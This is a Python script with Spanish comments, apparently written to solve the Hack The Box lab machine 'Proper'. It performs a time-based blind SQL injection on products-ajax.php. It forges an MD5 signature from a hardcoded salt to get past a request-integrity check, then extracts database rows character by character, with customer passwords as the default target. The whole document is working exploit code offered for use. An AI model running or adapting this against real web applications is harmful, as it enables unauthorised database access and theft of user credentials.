#!/usr/bin/python3

import requests, string, hashlib, time
import signal, sys, argparse
from pwn import *

# Color
class Color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

# Ctrl + C
def def_handler(sig, frame):
    print("\nInterrupción, saliendo...\n")
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# Argumentos
parse = argparse.ArgumentParser()
parse.add_argument('--db', dest="db_name", type=str, default="cleaner", help="Base de datos relacionada con la tabla (default: cleaner)")
parse.add_argument('--table', dest="table_name", type=str, default="customers", help="Tabla que contiene la columna a enumerar (default: customers)")
parse.add_argument('--column', dest="column_name", type=str, default="password", help="Columna de la que quieres ver su información (default: password)")
args = parse.parse_args()

# Variables
url = "http://proper.htb/products-ajax.php"
salt = "hie0shah6ooNoim"
#dic = "-" + string.digits + string.ascii_letters + string.punctuation + "£"
dic = string.hexdigits + "-£"
result = ""

# En caso de querer dumpear varios campos a la vez, los recibimos separados por coma (,)
columns_list = args.column_name.split(",")  # Dividimos la cadena según las comas (,) y generamos un array
columns2concat = ",'-',".join(columns_list)  # Ahora juntamos cada valor del array pero dandole el formato necesario que usa CONCAT (abajo lo usamos)

p1 = log.progress("p4ylOAd")
for row in range(20):
    p2 = log.progress(f"{'-'.join(columns_list)} [{row}]")
    for pos_word in range(1,501): # Hacemos de cuenta que la palabra a dumpear tiene 500 letras (su tamaño)
        for letter in dic:

            payload = f"IF(Ascii(substring((SELECT CONCAT({columns2concat}) FROM {args.db_name}.{args.table_name} LIMIT {row},1),{pos_word},1))={ord(letter)},sleep(0.3),0)#"
            hashh = hashlib.md5(salt.encode('utf-8') + payload.encode('utf-8')).hexdigest()

            p1.status(payload)
            p2.status(result + letter)

            time_before = time.time()

            data_get = {"order":payload, "h":hashh}
            r = requests.get(url, params=data_get)

            time_after = time.time()

            if time_after - time_before > 3:
                result += letter
                p2.status(result)
                break
            elif letter == "£":
                break

        if letter == "£" and pos_word == 1:
            p1.success("FINAAAAAL")
            p2.success(Color.RED + "----no---hay---más----" + Color.END)
            exit(0)
        elif letter == "£":
            p2.success(Color.BLUE + result + Color.END)
            result = ""
            break
    
p1.success("FINAAAAAL")
